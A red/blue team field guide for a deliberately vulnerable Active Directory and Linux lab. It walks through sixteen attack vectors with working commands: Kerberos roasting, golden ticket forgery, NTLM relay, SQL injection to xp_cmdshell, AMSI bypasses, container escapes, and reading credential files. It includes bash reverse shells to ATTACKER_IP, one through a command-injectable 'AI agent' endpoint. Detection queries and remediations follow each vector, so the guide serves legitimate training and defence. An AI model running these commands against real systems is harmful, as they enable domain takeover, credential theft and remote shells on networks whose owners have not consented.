# 📓 MODERN KILL LAB: OPERATOR'S FIELD GUIDE v8.0

This guide covers all attack vectors with step-by-step instructions for:
- 🔴 **Red Team:** Exploitation techniques
- 🔵 **Blue Team:** Detection, hunting, and response

---

# 🎯 TARGET ALPHA: Lab-DC01 (Windows Server 2022)

**Role:** Domain Controller, Database Server, Certificate Authority

---

## 🔓 VECTOR 1: AS-REP Roasting

| Property | Value |
|----------|-------|
| **Target** | `svc_backup` account |
| **Vulnerability** | "Do not require Kerberos preauthentication" enabled |
| **Password** | `Backup2024!` |
| **Tools** | Impacket GetNPUsers.py, Rubeus |

### 🔴 Red Team

**1. Request AS-REP Hash (No Creds Required):**
```bash
GetNPUsers.py LAB.local/svc_backup -no-pass -dc-ip 10.0.0.10 -format hashcat -outputfile asrep.hash
```

**2. Crack the Hash:**
```bash
hashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt
```

**Result:** `svc_backup:Backup2024!`

**Alternative with Rubeus (from Windows):**
```powershell
.\Rubeus.exe asreproast /user:svc_backup /format:hashcat /outfile:asrep.hash
```

### 🔵 Blue Team

**Detection - Event ID 4768:**
```powershell
Get-WinEvent -FilterHashtable @{LogName='Security';Id=4768} |
    Where-Object {$_.Properties[4].Value -eq '0x0'} |
    Select-Object TimeCreated, @{N='Account';E={$_.Properties[0].Value}}, @{N='IP';E={$_.Properties[9].Value}}
```

**Indicators:**
- Event ID 4768 with PreAuth Type = 0
- TGT requests from non-standard workstations

**Remediation:**
- Enable Kerberos preauth for all accounts
- Use 25+ character passwords for service accounts

---

## 🔓 VECTOR 2: Kerberoasting

| Property | Value |
|----------|-------|
| **Target** | `svc_sql` account |
| **SPN** | `MSSQLSvc/dc01.lab.local:1433` |
| **Password** | `Password123!` |
| **Tools** | Impacket GetUserSPNs.py, Rubeus |

### 🔴 Red Team

**1. Enumerate SPNs:**
```bash
GetUserSPNs.py LAB.local/helpdesk:Help123! -dc-ip 10.0.0.10
```

**2. Request TGS Hash:**
```bash
GetUserSPNs.py LAB.local/helpdesk:Help123! -dc-ip 10.0.0.10 -request -outputfile tgs.hash
```

**3. Crack the Hash:**
```bash
hashcat -m 13100 tgs.hash /usr/share/wordlists/rockyou.txt
```

**Result:** `svc_sql:Password123!`

### 🔵 Blue Team

**Detection - Event ID 4769:**
```powershell
Get-WinEvent -FilterHashtable @{LogName='Security';Id=4769} |
    Where-Object {$_.Properties[5].Value -eq '0x17'} |
    Select-Object TimeCreated, @{N='Service';E={$_.Properties[0].Value}}, @{N='User';E={$_.Properties[2].Value}}
```

**Indicators:**
- Event ID 4769 with Encryption Type 0x17 (RC4)
- Single user requesting multiple TGS tickets

**Remediation:**
- Use Group Managed Service Accounts (gMSA)
- Enforce AES encryption only

---

## 🔓 VECTOR 3: Golden Ticket

| Property | Value |
|----------|-------|
| **Target** | `krbtgt` account |
| **Password** | `GodMode123!` |
| **Tools** | Impacket ticketer.py, Mimikatz |

### 🔴 Red Team

**1. Get krbtgt NTLM Hash (if you have the password):**
```python
# Python - NTLM from password
import hashlib
password = "GodMode123!"
ntlm = hashlib.new('md4', password.encode('utf-16le')).hexdigest()
print(ntlm)
```

**2. Get Domain SID:**
```bash
lookupsid.py LAB.local/helpdesk:Help123!@10.0.0.10
```

**3. Forge Golden Ticket:**
```bash
ticketer.py -nthash <KRBTGT_NTLM_HASH> -domain-sid <DOMAIN_SID> -domain lab.local Administrator
```

**4. Use the Ticket:**
```bash
export KRB5CCNAME=Administrator.ccache
psexec.py -k -no-pass lab.local/Administrator@dc01.lab.local
```

**Alternative with Mimikatz:**
```
kerberos::golden /user:Administrator /domain:lab.local /sid:<SID> /krbtgt:<NTLM_HASH> /ptt
```

### 🔵 Blue Team

**Detection - Event ID 4769:**
```powershell
# TGS requests with forged TGT have anomalies
Get-WinEvent -FilterHashtable @{LogName='Security';Id=4769} |
    Where-Object {$_.Properties[0].Value -eq 'krbtgt'}
```

**Indicators:**
- TGT with abnormally long lifetime
- User SID mismatch
- Requests for krbtgt service

**Remediation:**
- Reset krbtgt password TWICE
- Monitor for TGT anomalies
- Implement PAC validation

---

## 🔓 VECTOR 4: AD CS Misconfiguration (ESC8)

| Property | Value |
|----------|-------|
| **Target** | `http://10.0.0.10/certsrv` |
| **Vulnerability** | Web Enrollment on HTTP without EPA |
| **Tools** | ntlmrelayx.py, PetitPotam, Coercer |

### 🔴 Red Team

**1. Verify HTTP Web Enrollment:**
```bash
curl -I http://10.0.0.10/certsrv/
# Look for: WWW-Authenticate: NTLM
```

**2. Setup NTLM Relay:**
```bash
# Terminal 1 - Start ntlmrelayx
ntlmrelayx.py -t http://10.0.0.10/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
```

**3. Coerce Authentication:**
```bash
# Terminal 2 - Trigger authentication
python3 PetitPotam.py ATTACKER_IP 10.0.0.10
# Or via SQL Injection:
# http://10.0.0.10:8080/hr_portal/index.php?id=1;EXEC xp_cmdshell 'ping ATTACKER_IP'--
```

**4. Use Obtained Certificate:**
```bash
# Request TGT with certificate
Rubeus.exe asktgt /user:DC01$ /certificate:cert.pfx /ptt
```

### 🔵 Blue Team

**Detection - Certificate Events:**
```powershell
Get-WinEvent -FilterHashtable @{LogName='Security';Id=4886,4887} |
    Select-Object TimeCreated, @{N='Requester';E={$_.Properties[0].Value}}, @{N='Template';E={$_.Properties[1].Value}}
```

**Indicators:**
- Certificate requests from unexpected hosts
- Machine accounts requesting user templates
- HTTP requests to /certsrv from external IPs

**Remediation:**
- Enable HTTPS on AD CS
- Enable Extended Protection for Authentication (EPA)
- Disable HTTP Web Enrollment if not needed

---

## 🔓 VECTOR 5: SQL Injection

| Property | Value |
|----------|-------|
| **Target** | `http://10.0.0.10:8080/hr_portal` |
| **Vulnerability** | `SELECT ... WHERE ID = $id` (unsanitized) |
| **Tools** | SQLMap, Burp Suite, Browser |

### 🔴 Red Team

**1. Test for SQLi:**
```bash
curl "http://10.0.0.10:8080/hr_portal/index.php?id=1'"
# Error = SQLi confirmed
```

**2. Extract Data:**
```bash
curl "http://10.0.0.10:8080/hr_portal/index.php?id=-1 UNION SELECT Name,Salary FROM Employees--"
```

**3. Enable xp_cmdshell (svc_sql is sysadmin):**
```bash
curl "http://10.0.0.10:8080/hr_portal/index.php?id=1;EXEC sp_configure 'show advanced options',1;RECONFIGURE--"
curl "http://10.0.0.10:8080/hr_portal/index.php?id=1;EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE--"
```

**4. Execute OS Commands:**
```bash
curl "http://10.0.0.10:8080/hr_portal/index.php?id=1;EXEC xp_cmdshell 'whoami'--"
```

**5. Automated with SQLMap:**
```bash
sqlmap -u "http://10.0.0.10:8080/hr_portal/index.php?id=1" --os-shell
```

### 🔵 Blue Team

**Detection - SQL Server Logs:**
```powershell
Get-WinEvent -FilterHashtable @{LogName='Application';ProviderName='MSSQLSERVER'} |
    Where-Object {$_.Message -match 'xp_cmdshell|UNION|sp_configure'}
```

**Indicators:**
- `UNION SELECT` in query logs
- `xp_cmdshell` enablement
- `sqlservr.exe` spawning `cmd.exe`

**Remediation:**
- Use parameterized queries
- Remove sysadmin from service accounts
- Disable xp_cmdshell permanently

---

## 🔓 VECTOR 6: Weak Service Permissions

| Property | Value |
|----------|-------|
| **Target** | `svc_sql` account |
| **Vulnerability** | Member of SQL Server `sysadmin` role |
| **Tools** | SQLMap, Netcat |

### 🔴 Red Team

**Once you have svc_sql credentials or SQLi access:**

**1. Enable xp_cmdshell:**
```sql
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
```

**2. Execute Commands:**
```sql
EXEC xp_cmdshell 'whoami';
EXEC xp_cmdshell 'net user hacker P@ssw0rd /add';
EXEC xp_cmdshell 'net localgroup Administrators hacker /add';
```

**3. Reverse Shell:**
```sql
EXEC xp_cmdshell 'powershell -e <BASE64_PAYLOAD>';
```

### 🔵 Blue Team

**Detection:**
- Monitor `xp_cmdshell` usage
- Alert on new local administrators
- Monitor SQL Server process spawning shells

---

## 🔓 VECTOR 7: Fake Cloud Credentials

| Property | Value |
|----------|-------|
| **Target** | `C:\Program Files\Azure AD Sync\connection.xml` |
| **Password** | `Valhalla123!` (Base64 encoded) |
| **Tools** | PowerShell, aadconnect-extract |

### 🔴 Red Team

**1. Read the Config:**
```powershell
type "C:\Program Files\Azure AD Sync\connection.xml"
```

**2. Extract Base64:**
```xml
<PasswordEncrypted>VABhAGwAbABoAGEAbABsAGEAMQAyADMAIQ==</PasswordEncrypted>
```

**3. Decode:**
```powershell
[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String("VABhAGwAbABoAGEAbABsAGEAMQAyADMAIQ=="))
```

**Result:** `Valhalla123!`

### 🔵 Blue Team

**Detection:**
```powershell
# Monitor file access to Azure AD Sync folder
Get-WinEvent -FilterHashtable @{LogName='Security';Id=4663} |
    Where-Object {$_.Properties[5].Value -like "*Azure AD Sync*"}
```

---

## 🔓 VECTOR 8: AMSI & EDR Bypass

| Property | Value |
|----------|-------|
| **Target** | `C:\Tools\AMSILab\`, `C:\Tools\VEHLab\` |
| **Tools** | PowerShell, C# exploits |

### 🔴 Red Team

**AMSI Bypass (Reflection):**
```powershell
$a=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
$a.GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

**AMSI Bypass (Registry - Lab has weak ACLs):**
```powershell
Remove-Item "HKLM:\SOFTWARE\Microsoft\AMSI\Providers\*" -Recurse -Force
```

**Bypass FakeEDR:**
```c
// Remove VEH handlers
RemoveVectoredExceptionHandler(handler);

// Clear debug registers
CONTEXT ctx;
ctx.Dr0 = ctx.Dr1 = ctx.Dr2 = ctx.Dr3 = ctx.Dr7 = 0;
SetThreadContext(hThread, &ctx);
```

### 🔵 Blue Team

**Detection:**
```powershell
# Monitor AMSI registry
Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-Sysmon/Operational';Id=12,13} |
    Where-Object {$_.Properties[4].Value -like "*AMSI*"}

# ScriptBlock logging for bypass attempts
Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-PowerShell/Operational';Id=4104} |
    Where-Object {$_.Message -match 'AmsiUtils|amsiInitFailed'}
```

---

# 🎯 TARGET BRAVO: Lab-Web01 (Debian 12)

**Role:** Web Server, Application Security Host, Pivot Point  
**Domain Status:** Joined to LAB.local

---

## 🔓 VECTOR 9: SMB Remote Code Execution

| Property | Value |
|----------|-------|
| **Target** | `//10.0.0.20/backup_drop` |
| **Vulnerability** | Cron executes `*.sh` files as ROOT every minute |
| **Tools** | smbclient, net view |

### 🔴 Red Team

**1. Connect Anonymously:**
```bash
smbclient //10.0.0.20/backup_drop -N
```

**2. Create Reverse Shell Script:**
```bash
echo '#!/bin/bash
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' > shell.sh
```

**3. Upload Script:**
```bash
smb: \> put shell.sh
```

**4. Start Listener and Wait (~60 seconds):**
```bash
nc -lvnp 4444
# ROOT SHELL INCOMING!
```

### 🔵 Blue Team

**Detection:**
```bash
# Monitor cron execution
sudo tail -f /var/log/syslog | grep CRON

# Monitor SMB access
sudo tail -f /var/log/samba/log.smbd

# auditd - watch share directory
sudo auditctl -w /home/vagrant/share -p wa -k smb_drop
sudo ausearch -k smb_drop
```

**Indicators:**
- New .sh files appearing in `/home/vagrant/share`
- Cron executing scripts from SMB share
- Root bash processes spawned by cron

**Remediation:**
- Remove guest access from SMB
- Don't use `force user = root`
- Remove dangerous cron job

---

## 🔓 VECTOR 10: Insecure AI Agent

| Property | Value |
|----------|-------|
| **Target** | `http://10.0.0.20:5000` |
| **Vulnerability** | `subprocess.check_output(query, shell=True)` |
| **Tools** | curl, Browser |

### 🔴 Red Team

**1. Test RCE:**
```bash
curl "http://10.0.0.20:5000/ask?query=id"
# Returns: uid=0(root)...

curl "http://10.0.0.20:5000/ask?query=cat%20/etc/shadow"
```

**2. Steal Kubeconfig:**
```bash
curl "http://10.0.0.20:5000/ask?query=cat%20/home/vagrant/.kube/config"
```

**3. Reverse Shell:**
```bash
nc -lvnp 4444
curl "http://10.0.0.20:5000/ask?query=bash%20-c%20'bash%20-i%20%3E%26%20/dev/tcp/ATTACKER_IP/4444%200%3E%261'"
```

### 🔵 Blue Team

**Detection:**
```bash
# Monitor processes spawned by Python
ps auxf | grep -A5 python3

# auditd
sudo ausearch -c bash --ppid $(pgrep -f app.py)
```

---

## 🔓 VECTOR 11: Unsecured Kubernetes

| Property | Value |
|----------|-------|
| **Target** | `vuln-admin-sa` ServiceAccount |
| **Vulnerability** | Has `cluster-admin` privileges |
| **Tools** | kubectl |

### 🔴 Red Team

**1. Get ServiceAccount Token:**
```bash
# Via AI Agent
curl "http://10.0.0.20:5000/ask?query=cat%20/var/run/secrets/kubernetes.io/serviceaccount/token"

# Or locally
kubectl get secret -o jsonpath='{.items[?(@.metadata.annotations.kubernetes\.io/service-account\.name=="vuln-admin-sa")].data.token}' | base64 -d
```

**2. Use Token:**
```bash
kubectl --token=$TOKEN --server=https://10.0.0.20:6443 --insecure-skip-tls-verify get secrets -A
```

**3. Deploy Privileged Pod:**
```bash
kubectl apply -f - <<EOF
apiVersion: v1
kind: Pod
metadata:
  name: pwned
spec:
  serviceAccountName: vuln-admin-sa
  hostPID: true
  hostNetwork: true
  containers:
  - name: pwned
    image: ubuntu
    securityContext:
      privileged: true
    command: ["sleep", "infinity"]
    volumeMounts:
    - mountPath: /host
      name: hostfs
  volumes:
  - name: hostfs
    hostPath:
      path: /
EOF
```

### 🔵 Blue Team

**Detection:**
```bash
# K8s API audit logs
sudo cat /var/log/containers/kube-apiserver* | grep -E "secrets|privileged"
```

---

## 🔓 VECTOR 12: Privileged Container

| Property | Value |
|----------|-------|
| **Container** | `vuln_priv` |
| **Vulnerability** | `--privileged` flag |
| **Tools** | Docker escape exploits |

### 🔴 Red Team

**1. Enter Container:**
```bash
docker exec -it container_lab-vuln_priv-1 bash
```

**2. Find Host Disk:**
```bash
fdisk -l
# Find /dev/sda1
```

**3. Mount and Escape:**
```bash
mkdir /mnt/host
mount /dev/sda1 /mnt/host
chroot /mnt/host
# Now on HOST as root
```

### 🔵 Blue Team

**Detection:**
```bash
# Monitor mount syscalls
sudo ausearch -sc mount -i

# Docker events
docker events --filter 'type=container'
```

---

## 🔓 VECTOR 13: Docker Socket Mount

| Property | Value |
|----------|-------|
| **Container** | `vuln_sock` |
| **Vulnerability** | `/var/run/docker.sock` mounted |
| **Tools** | docker CLI |

### 🔴 Red Team

**1. Enter Container:**
```bash
docker exec -it container_lab-vuln_sock-1 bash
```

**2. Install Docker CLI:**
```bash
apt update && apt install -y docker.io
```

**3. Spawn Privileged Container:**
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host
# Now on HOST as root
```

### 🔵 Blue Team

**Detection:**
```bash
# Monitor docker socket access
sudo ausearch -f /var/run/docker.sock

# Watch for new containers
docker events --filter 'event=create'
```

---

## 🔓 VECTOR 14: Sudo Misconfiguration

| Property | Value |
|----------|-------|
| **User** | `vagrant` |
| **Vulnerability** | `NOPASSWD: /usr/bin/vim` |
| **Tools** | Terminal |

### 🔴 Red Team

**Escape to Root:**
```bash
sudo vim -c ':!/bin/bash'
# Now root!
```

**Alternative:**
```bash
sudo vim
:set shell=/bin/bash
:shell
```

### 🔵 Blue Team

**Detection:**
```bash
# Monitor sudo commands
sudo ausearch -m USER_CMD -i | grep vim
```

---

## 🔓 VECTOR 15: Hardcoded API Secrets

| Property | Value |
|----------|-------|
| **Location** | `/home/vagrant/exfil_lab/.env` |
| **Contents** | Fake AWS/Stripe keys |
| **Tools** | grep, find |

### 🔴 Red Team

**Find and Extract:**
```bash
cat /home/vagrant/exfil_lab/.env
# API_KEY=sk_live_1234567890abcdef
# AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE

# Search for more secrets
grep -r "API_KEY\|SECRET\|PASSWORD" /home/vagrant/ 2>/dev/null
find / -name "*.env" 2>/dev/null
```

### 🔵 Blue Team

**Detection:**
```bash
# Monitor sensitive file access
sudo auditctl -w /home/vagrant/exfil_lab/.env -p r -k secrets
sudo ausearch -k secrets
```

---

## 🔓 VECTOR 16: API Logic Flaws (vAPI & crAPI)

| Property | Value |
|----------|-------|
| **vAPI** | `http://10.0.0.20:5002` |
| **crAPI** | `http://10.0.0.20:8888` |
| **Vulnerabilities** | BOLA/IDOR, Mass Assignment |
| **Tools** | Postman, Burp Suite |

### 🔴 Red Team

**BOLA/IDOR (Access Other Users):**
```bash
# Get your user ID
curl http://10.0.0.20:5002/api/users/1

# Try other IDs
curl http://10.0.0.20:5002/api/users/2
curl http://10.0.0.20:5002/api/users/3
```

**Mass Assignment:**
```bash
# Try to set admin flag
curl -X POST http://10.0.0.20:5002/api/users -d '{"username":"test","password":"test","isAdmin":true}'
```

### 🔵 Blue Team

**Detection:**
- Monitor for sequential ID access patterns
- Alert on privilege escalation attempts
- Log all API authentication events

---

# BLUE TEAM QUICK REFERENCE

## Key Windows Events (DC01)

| Event ID | Description |
|----------|-------------|
| 4768 | Kerberos TGT Request (AS-REP) |
| 4769 | Kerberos TGS Request (Kerberoast) |
| 4886 | Certificate Request |
| 4887 | Certificate Issued |
| 4104 | PowerShell ScriptBlock |
| 4688 | Process Creation |

## Key Linux Monitoring (Web01)

```bash
# auditd - all recent events
sudo ausearch -ts recent -i

# SMB share monitoring
sudo ausearch -f /home/vagrant/share -i

# Cron monitoring
sudo tail -f /var/log/syslog | grep CRON

# Docker monitoring
docker events --filter 'type=container'
```

---

*End of Guide. Hunt well.* 🎯
